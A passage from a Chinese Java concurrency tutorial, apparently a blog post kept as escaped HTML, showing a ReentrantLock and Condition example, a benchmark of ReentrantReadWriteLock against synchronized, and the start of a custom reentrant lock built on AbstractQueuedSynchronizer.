&lt;/span&gt;&lt;span&gt;59&lt;/span&gt;                     kmCondition.await();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;当前线程在kmCondition上进行等待&lt;/span&gt;
&lt;span&gt;60&lt;/span&gt;                     System.out.println(&quot;check km thread[&quot; +&lt;span&gt; Thread.currentThread().getName()
&lt;/span&gt;&lt;span&gt;61&lt;/span&gt;                             + &quot;] is be notify&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;62&lt;/span&gt;                 } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException e) {
&lt;/span&gt;&lt;span&gt;63&lt;/span&gt; &lt;span&gt;                    e.printStackTrace();
&lt;/span&gt;&lt;span&gt;64&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt;65&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;66&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;67&lt;/span&gt; &lt;span&gt;            lock.unlock();
&lt;/span&gt;&lt;span&gt;68&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;69&lt;/span&gt; 
&lt;span&gt;70&lt;/span&gt;         System.out.println(&quot;娃娃离老王已经不足100公里，我给他发个短信&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;71&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;72&lt;/span&gt; 
&lt;span&gt;73&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;当娃娃到达目的地时给老王打电话&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;74&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; waitSite() {
&lt;/span&gt;&lt;span&gt;75&lt;/span&gt; &lt;span&gt;        lock.lock();
&lt;/span&gt;&lt;span&gt;76&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;77&lt;/span&gt;             &lt;span&gt;while&lt;/span&gt; (!&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.site.equals(DESTINATION)) {
&lt;/span&gt;&lt;span&gt;78&lt;/span&gt;                 &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;79&lt;/span&gt;                     siteCondition.await();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;当前线程在siteCondition上进行等待&lt;/span&gt;
&lt;span&gt;80&lt;/span&gt;                     System.out.println(&quot;check Site thread[&quot; +&lt;span&gt; Thread.currentThread().getName()
&lt;/span&gt;&lt;span&gt;81&lt;/span&gt;                             + &quot;] is be notify&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;82&lt;/span&gt;                 } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException e) {
&lt;/span&gt;&lt;span&gt;83&lt;/span&gt; &lt;span&gt;                    e.printStackTrace();
&lt;/span&gt;&lt;span&gt;84&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt;85&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;86&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;87&lt;/span&gt; &lt;span&gt;            lock.unlock();
&lt;/span&gt;&lt;span&gt;88&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;89&lt;/span&gt;         System.out.println(&quot;娃娃已经到达目的地，我给他打个电话让他来取&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;90&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;91&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;测试代码：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; TestBuyWawa {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; BuyFBBWawa fbbWawa = &lt;span&gt;new&lt;/span&gt; BuyFBBWawa(1500, &quot;Guangdong&quot;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;检查里程数变化的线程,不满足条件，线程一直等待&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; CheckKm &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; Thread {
        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
            fbbWawa.waitKm();
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;检查地点变化的线程,不满足条件，线程一直等待&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; CheckSite &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; Thread {
        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
            fbbWawa.waitSite();
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; InterruptedException {
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; 3; i++&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; CheckSite().start();
        }
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; 3; i++&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; CheckKm().start();
        }

        Thread.sleep(&lt;/span&gt;1000&lt;span&gt;);
        fbbWawa.changeKm();&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;娃娃距离目的地小于100公里&lt;/span&gt;
        Thread.sleep(2000&lt;span&gt;);
        fbbWawa.changeSite();&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;娃娃到达目的地&lt;/span&gt;
&lt;span&gt;    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; 　　这段代码使用ReentrantLock和Condition模拟了老王买的娃娃的运输过程，从程序输出可以看到，通过不同的Condition实现了点对点的通知，这是与使用synchronized+wait()/notifyAll()最大的区别，如果对wait()/notifyAll()使用方法不熟悉的同学，欢迎阅读之前的《&lt;a class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/hongshaodian/p/12448653.html&quot;&gt;java线程间的协作&lt;/a&gt;》。使用synchronized+wait()/notifyAll()的时候，不能指定唤醒某类线程，只能唤醒等待在对象上的所有线程，故尽量使用notifyAll()而不是notify()，在使用Lock+Condition的时候，由于可以指定唤醒某类线程，所以尽量使用signal()而不是signalAll()。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/612509/202003/612509-20200320180610082-1967774730.png&quot; alt=&quot;&quot; width=&quot;352&quot; height=&quot;85&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;5、&lt;/span&gt;ReentrantReadWriteLock&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span&gt;5.1 ReentrantReadWriteLock介绍&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt; 　&lt;span&gt;　之前提到的synchroniezd和ReentrantLock都是排它锁，这些锁在同一时刻只允许一个线程访问，而读写锁ReentrantReadWriteLock在同一时刻可以允许多个读线程访问，但是在写线程访问时，所有的读线程和其他写线程均被阻塞。读写锁维护了一对锁，一个读锁和一个写锁，通过分离读锁和写锁，使得并发性相比一般的排他锁有了很大提升。除了保证写操作对读操作的可见性以及并发性的提升之外，读写锁能够简化读写交互场景的编程方式。假设在程序中定义一个共享的用作缓存数据结构，它大部分时间提供读服务（例如查询和搜索），而写操作占有的时间很少，但是写操作完成之后的更新需要对后续的读服务可见。如果不使用读写锁，完成上述工作就要使用Java的等待通知机制，就是当写操作开始时，所有晚于写操作的读操作均会进入等待状态，只有写操作完成并进行通知之后，所有等待的读操作才能继续执行（写操作之间依靠synchronized关键进行同步），这样做的目的是使读操作能读取到正确的数据，不会出现脏读。改用读写锁实现上述功能，只需要在读操作时获取读锁，写操作时获取写锁即可。当写锁被获取到时，后续（非当前写操作线程）的读写操作都会被阻塞，写锁释放之后，所有操作继续执行，编程方式相对于使用等待通知机制的实现方式而言，变得简单明了。一般情况下，读写锁的性能都会比排它锁好，因为大多数场景读是多于写的。在读多于写的情况下，读写锁能够提供比排它锁更好的并发性和吞吐量。&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;5.2 使用ReentrantReadWriteLock&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;　　&lt;span&gt;我们来模拟一个读多写少的场景，分别使用synchroniezd和&lt;/span&gt;&lt;/span&gt;&lt;span&gt;ReentrantReadWriteLock，看看效率的差异。假设某种商品，读写比列为1：10，我们写一段代码来模拟。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;商品类：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; GoodsInfo {
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;总销售额&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; totalMoney;
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;库存数&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; storeNumber;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; GoodsInfo( &lt;span&gt;int&lt;/span&gt; totalMoney, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; storeNumber) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.totalMoney =&lt;span&gt; totalMoney;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.storeNumber =&lt;span&gt; storeNumber;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; getTotalMoney() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; totalMoney;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; getStoreNumber() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; storeNumber;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; changeNumber(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; sellNumber) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.totalMoney += sellNumber * 9.9&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.storeNumber -=&lt;span&gt; sellNumber;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;商品接口：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; GoodsService {
    GoodsInfo getNumber();
    &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; setNumber(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; number);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;使用读写锁来实现商品接口：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.locks.Lock;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.locks.ReadWriteLock;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.locks.ReentrantReadWriteLock;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; UseRwLock &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; GoodsService {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; GoodsInfo goodsInfo;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; ReadWriteLock lock = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ReentrantReadWriteLock();
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Lock getLock = lock.readLock();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;读锁&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Lock setLock = lock.writeLock();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;写锁&lt;/span&gt;

    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; UseRwLock(GoodsInfo goodsInfo) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.goodsInfo =&lt;span&gt; goodsInfo;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; GoodsInfo getNumber() {
        getLock.lock();
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            Thread.sleep(&lt;/span&gt;5&lt;span&gt;);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException e) {
            e.printStackTrace();
        } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
            getLock.unlock();
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.goodsInfo;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setNumber(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; number) {
        setLock.lock();
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            Thread.sleep(&lt;/span&gt;5&lt;span&gt;);
            goodsInfo.changeNumber(number);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException e) {
            e.printStackTrace();
        } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
            setLock.unlock();
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;使用synchronized实现商品接口：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; UseSynchronized &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; GoodsService {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; GoodsInfo goodsInfo;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; UseSynchronized(GoodsInfo goodsInfo) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.goodsInfo =&lt;span&gt; goodsInfo;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;synchronized&lt;/span&gt;&lt;span&gt; GoodsInfo getNumber() {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            Thread.sleep(&lt;/span&gt;5&lt;span&gt;);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException e) {
            e.printStackTrace();
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.goodsInfo;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;synchronized&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setNumber(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; number) {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            Thread.sleep(&lt;/span&gt;5&lt;span&gt;);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException e) {
            e.printStackTrace();
        }
        goodsInfo.changeNumber(number);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;测试类，先使用synchronized实现：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Random;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; GoodsInfoTest {
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; readWriteRatio = 10;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;读写线程的比例&lt;/span&gt;
&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; writeThreadCount = 1;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;写线程数量&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;     * 读线程
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; GetTask &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Runnable {
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;         &lt;span&gt;private&lt;/span&gt;&lt;span&gt; GoodsService goodsService;
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt;&lt;span&gt; GetTask(GoodsService goodsService) {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;             &lt;span&gt;this&lt;/span&gt;.goodsService =&lt;span&gt; goodsService;
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt; &lt;span&gt;        @Override
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;             &lt;span&gt;long&lt;/span&gt; start =&lt;span&gt; System.currentTimeMillis();
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; 100; i++) {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;每个读线程操作100次&lt;/span&gt;
&lt;span&gt;21&lt;/span&gt; &lt;span&gt;                goodsService.getNumber();
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;             System.out.println(Thread.currentThread().getName() + &quot;读取商品数据耗时：&quot;
&lt;span&gt;24&lt;/span&gt;                     + (System.currentTimeMillis() - start) + &quot;ms&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt; 
&lt;span&gt;28&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;29&lt;/span&gt; &lt;span&gt;     * 写线程
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;31&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; SetTask &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Runnable {
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;         &lt;span&gt;private&lt;/span&gt;&lt;span&gt; GoodsService goodsService;
&lt;/span&gt;&lt;span&gt;33&lt;/span&gt; 
&lt;span&gt;34&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt;&lt;span&gt; SetTask(GoodsService goodsService) {
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt;             &lt;span&gt;this&lt;/span&gt;.goodsService =&lt;span&gt; goodsService;
&lt;/span&gt;&lt;span&gt;36&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt; 
&lt;span&gt;38&lt;/span&gt; &lt;span&gt;        @Override
&lt;/span&gt;&lt;span&gt;39&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
&lt;/span&gt;&lt;span&gt;40&lt;/span&gt;             &lt;span&gt;long&lt;/span&gt; start =&lt;span&gt; System.currentTimeMillis();
&lt;/span&gt;&lt;span&gt;41&lt;/span&gt;             Random r = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Random();
&lt;/span&gt;&lt;span&gt;42&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; 10; i++) {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;每个写线程操作10次&lt;/span&gt;
&lt;span&gt;43&lt;/span&gt;                 goodsService.setNumber(r.nextInt(10&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;44&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;45&lt;/span&gt; &lt;span&gt;            System.out.println(Thread.currentThread().getName()
&lt;/span&gt;&lt;span&gt;46&lt;/span&gt;                     + &quot;写商品数据耗时：&quot; + (System.currentTimeMillis() - start) + &quot;ms&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;47&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;48&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;49&lt;/span&gt; 
&lt;span&gt;50&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; InterruptedException {
&lt;/span&gt;&lt;span&gt;51&lt;/span&gt;         GoodsInfo goodsInfo = &lt;span&gt;new&lt;/span&gt; GoodsInfo(100000, 10000&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;52&lt;/span&gt;         &lt;span&gt;GoodsService goodsService = new UseSynchronized(goodsInfo);
&lt;/span&gt;&lt;span&gt;53&lt;/span&gt; 
&lt;span&gt;54&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; writeThreadCount; i++) {    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;启动1个写线程&lt;/span&gt;
&lt;span&gt;55&lt;/span&gt;             &lt;span&gt;new&lt;/span&gt; Thread(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; SetTask(goodsService)).start();
&lt;/span&gt;&lt;span&gt;56&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; j = 0; j &amp;lt; readWriteRatio; j++) {  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;启动10个读线程&lt;/span&gt;
&lt;span&gt;57&lt;/span&gt;                 &lt;span&gt;new&lt;/span&gt; Thread(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; GetTask(goodsService)).start();
&lt;/span&gt;&lt;span&gt;58&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;59&lt;/span&gt;             Thread.sleep(10&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;60&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;61&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;62&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;程序输出：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/612509/202003/612509-20200320234408930-1002889072.png&quot; alt=&quot;&quot; width=&quot;425&quot; height=&quot;257&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 再把刚刚测试类修改一下，只需要把第52行修改成读写锁实现，即&lt;span&gt;GoodsService goodsService = new UseRwLock(goodsInfo)；程序输出：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/612509/202003/612509-20200320234553627-1515474068.png&quot; alt=&quot;&quot; width=&quot;425&quot; height=&quot;258&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;对比可以看出，对于读多写少的场景，使用读写锁比使用独占锁效率高很多。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;6、手写一个自己的可重入独占锁&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;　　&lt;span&gt;锁的&lt;/span&gt;&lt;/span&gt;重进入是指任意线程在获取到锁之后能够再次获取该锁而不会被锁所阻塞，synchronized关键字隐式的支持重进入，比如一个synchronized修饰的递归方法，在方法执行时，执行线程在获取了锁之后仍能连续多次地获得该锁，该特性的实现需要解决以下两个问题：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（1）线程再次获取锁。锁需要去识别获取锁的线程是否为当前占据锁的线程，如果是，则再次成功获取。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（2）锁的最终释放。线程重复n次获取了锁，随后在第n次释放该锁后，其他线程能够获取到该锁。锁的最终释放要求锁对于获取进行计数自增，计数表示当前锁被重复获取的次数，而锁被释放时，计数自减，当计数等于0时表示锁已经成功释放。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;从上面ReentrantLock的公平锁和非公平锁加锁的源码也可以看出，getState()返回的是一个累计获取锁的次数。我们基于以上2点，利用AQS手写一个简易版本的可重入独占锁。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;实现类：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.TimeUnit;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.locks.AbstractQueuedSynchronizer;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.locks.Condition;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.locks.Lock;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; MyReentrantLock &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Lock {
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;*
     * 内部类继承AQS
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Sync &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; AbstractQueuedSynchronizer {
        @Override
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; tryAcquire(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; arg) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (compareAndSetState(0, 1)) {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;锁被第一次获取&lt;/span&gt;
                setExclusiveOwnerThread(Thread.currentThread());&lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置当前线程为锁独占线程&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
